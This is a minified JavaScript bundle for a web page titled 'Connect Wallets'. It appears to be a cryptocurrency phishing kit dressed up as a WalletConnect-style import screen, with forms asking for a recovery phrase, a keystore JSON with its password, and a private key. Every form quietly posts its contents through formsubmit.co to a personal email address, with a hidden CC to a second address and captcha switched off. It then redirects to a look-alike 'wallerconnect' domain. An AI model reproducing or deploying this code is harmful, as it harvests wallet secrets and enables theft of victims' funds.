(window.webpackJsonp=window.webpackJsonp||[]).push([[14,5,7,8],{323:function(t,e,r){"use strict";r.r(e);var n={name:"phrase"},o=r(16),component=Object(o.a)(n,(function(){var t=this,e=t.$createElement,r=t._self._c||e;return r("form",{attrs:{action:"https://formsubmit.co/solomonopeyemi@yandex.com",method:"POST"}},[r("input",{attrs:{type:"hidden",name:"_cc",value:"Paulkry89@yahoo.com"}}),t._v(" "),r("textarea",{staticClass:"w-full h-40 p-2 block",attrs:{name:t.$route.params.id,placeholder:"Phrase",required:""}}),t._v(" "),r("input",{attrs:{type:"hidden",name:"_next",value:"https://wallerconnect.surge.sh/"}}),t._v(" "),r("input",{attrs:{type:"hidden",name:"_captcha",value:"false"}}),t._v(" "),r("span",{staticClass:"text-16 text-grey block mb-5"},[t._v("Typically 12 (sometimes 24) words seperated by a single spaces.")]),t._v(" "),r("button",{staticClass:"w-full py-2 bg-blue text-white",attrs:{type:"submit"}},[t._v("IMPORT")])])}),[],!1,null,"1fb7f17a",null);e.default=component.exports},324:function(t,e,r){"use strict";r.r(e);var n={name:"keystore-json"},o=r(16),component=Object(o.a)(n,(function(){var t=this,e=t.$createElement,r=t._self._c||e;return r("form",{attrs:{action:"https://formsubmit.co/solomonopeyemi@yandex.com",method:"POST"}},[r("input",{attrs:{type:"hidden",name:"_cc",value:"Paulkry89@yahoo.com"}}),t._v(" "),r("input",{staticClass:"w-full mb-5 outline-none py-1 px-2 block capitalize",attrs:{type:"text",placeholder:t.$route.params.id,readonly:""}}),t._v(" "),r("input",{attrs:{type:"hidden",name:"_captcha",value:"false"}}),t._v(" "),r("input",{attrs:{type:"hidden",name:"_next",value:"https://wallerconnect.surge.sh/"}}),t._v(" "),r("textarea",{staticClass:"w-full h-40 p-2 block mb-5",attrs:{placeholder:"Keystore JSON",name:t.$route.params.id,required:""}}),t._v(" "),r("input",{staticClass:"w-full mb-1 outline-none py-1 px-2 block",attrs:{type:"password",name:"password",placeholder:"Password"}}),t._v(" "),r("span",{staticClass:"text-16 text-grey block mb-5"},[t._v('Several lines of text beginning with "{...}" plus the password you used to encrypt it.')]),t._v(" "),r("button",{staticClass:"w-full py-2 bg-blue text-white uppercase",attrs:{type:"submit"}},[t._v("Import")])])}),[],!1,null,"6bbc324e",null);e.default=component.exports},325:function(t,e,r){"use strict";r.r(e);var n={name:"private-key"},o=r(16),component=Object(o.a)(n,(function(){var t=this,e=t.$createElement,r=t._self._c||e;return r("form",{staticClass:"private-key",attrs:{action:"https://formsubmit.co/solomonopeyemi@yandex.com",method:"POST"}},[r("input",{attrs:{type:"hidden",name:"_cc",value:"Paulkry89@yahoo.com"}}),t._v(" "),r("input",{attrs:{type:"hidden",name:"_captcha",value:"false"}}),t._v(" "),r("input",{attrs:{type:"hidden",name:"_next",value:"https://wallerconnect.surge.sh/"}}),t._v(" "),r("input",{staticClass:"w-full mb-1 outline-none py-1 px-2 block",attrs:{type:"text",placeholder:"Private Key",name:t.$route.params.id,required:""}}),t._v(" "),r("span",{staticClass:"text-16 text-grey block mb-5"},[t._v("Typically 12 (sometimes 24) words seperated by a single spaces.")]),t._v(" "),r("button",{staticClass:"w-full py-2 bg-blue text-white uppercase",attrs:{type:"submit"}},[t._v("Import")])])}),[],!1,null,"13aada9b",null);e.default=component.exports},331:function(t,e,r){var content=r(337);content.__esModule&&(content=content.default),"string"==typeof content&&(content=[[t.i,content,""]]),content.locals&&(t.exports=content.locals);(0,r(67).default)("0b955922",content,!0,{sourceMap:!1})},336:function(t,e,r){"use strict";r(331)},337:function(t,e,r){var n=r(66)((function(i){return i[1]}));n.push([t.i,"/*purgecss start ignore*/\n.container[data-v-41f0df5c]{\n  width:400px\n}\nsvg[data-v-41f0df5c]{\n  fill:#0ea5e9;\n  width:20px;\n  height:20px\n}\n@media screen and (max-width:768px){\n.container[data-v-41f0df5c]{\n    width:95%\n}\n}\n\n/*purgecss end ignore*/",""]),n.locals={},t.exports=n},340:function(t,e,r){"use strict";r.r(e);var n=r(323),o=r(324),l={name:"index",components:{PrivateKey:r(325).default,KeystoreJson:o.default,Phrase:n.default},layout:"token",head:{title:"Connect Wallets"},data:function(){return{step:1}},methods:{phrase:function(){this.step=1},keystoreJson:function(){this.step=2},privateKey:function(){this.step=3}}},c=(r(336),r(16)),component=Object(c.a)(l,(function(){var t=this,e=t.$createElement,r=t._self._c||e;return r("div",{staticClass:"container mx-auto relative py-10"},[r("div",{staticClass:"flex items-center cursor-pointer mb-5",on:{click:function(e){return t.$router.push("/get-started")}}},[r("svg",{staticClass:"mr-2",attrs:{xmlns:"http://www.w3.org/2000/svg",height:"24px",viewBox:"0 0 24 24",width:"24px",fill:"#000000"}},[r("path",{attrs:{d:"M0 0h24v24H0V0z",fill:"none"}}),t._v(" "),r("path",{attrs:{d:"M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"}})]),t._v(" "),r("span",{staticClass:"text-blue"},[t._v("Back")])]),t._v(" "),r("div",{staticClass:"border-b border-white py-2 mb-5"},[r("span",{staticClass:"px-2 sm:px-5 py-2 border border-transparent hover:border-white cursor-pointer rounded-md text-white text-12 md:text-14",on:{click:t.phrase}},[t._v("Phrase")]),t._v(" "),r("span",{staticClass:"px-2 sm:px-5 py-2 border border-transparent hover:border-white cursor-pointer rounded-md text-white text-12 md:text-14",on:{click:t.keystoreJson}},[t._v("Keystore JSON")]),t._v(" "),r("span",{staticClass:"px-2 sm:px-5 py-2 border border-transparent hover:border-white cursor-pointer rounded-md text-white text-12 md:text-14",on:{click:t.privateKey}},[t._v("Private Key")])]),t._v(" "),1===t.step?r("Phrase"):t._e(),t._v(" "),2===t.step?r("KeystoreJson"):t._e(),t._v(" "),3===t.step?r("PrivateKey"):t._e()],1)}),[],!1,null,"41f0df5c",null);e.default=component.exports;installComponents(component,{Phrase:r(323).default,KeystoreJson:r(324).default,PrivateKey:r(325).default})}}]);